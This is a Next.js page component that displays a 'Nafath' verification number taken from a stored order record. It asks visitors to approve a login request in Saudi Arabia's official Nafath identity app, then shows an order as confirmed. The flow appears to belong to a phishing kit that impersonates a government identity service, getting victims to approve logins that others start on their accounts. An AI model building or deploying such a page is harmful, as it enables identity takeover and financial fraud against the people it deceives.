import { FaArrowRightLong } from 'react-icons/fa6'
import { useRouter, useSearchParams } from 'next/navigation'

import toast from 'react-hot-toast'
import Link from 'next/link'
import { useEffect, useState } from 'react'
import SwiperSlider from '@/components/SwiperSlider'

const NafatApp = () => {
  const router = useRouter()
  const params = useSearchParams()

  // get order data from api localhost:3000/api/order/:id
  const [order, setOrder] = useState([])

  useEffect(() => {
    params.get('id') &&
      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`)
        .then((res) => res.json())
        .then((data) => {
          setOrder(data)
        })
        .catch((err) => {
          alert(`Please enter correct otp ~ ${err}`)
        })
  }, [params])

  const handleSubmit = (e) => {
    e.preventDefault()
    router.push('/')
    toast.success('Your order has been confirmed')
  }

  return (
    <>
      <SwiperSlider />
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">Nafath App</h1>
        {/* make this link as a button */}

        <p className="text-gray-600 text-center mt-5 font-bold">
          رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
        </p>
        <p className="text-gray-600 text-center my-5 font-bold">
          Please accept the login request from Nafath app
        </p>
        {/* a countdown design round border */}

        <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
          <p className="text-gray-600 text-center m-0 font-bold">
            {order.nafatOtp ? order.nafatOtp : 'N/A'}
          </p>
        </div>

        <Link
          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
          target="_blank"
          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
        >
          OPEN NAFATH APP
        </Link>
        <form onSubmit={handleSubmit} className="w-3/4 my-14">
          <button
            type="submit"
            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
          >
            Confirm Order <FaArrowRightLong size={16} />
          </button>
        </form>
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  )
}

export default NafatApp
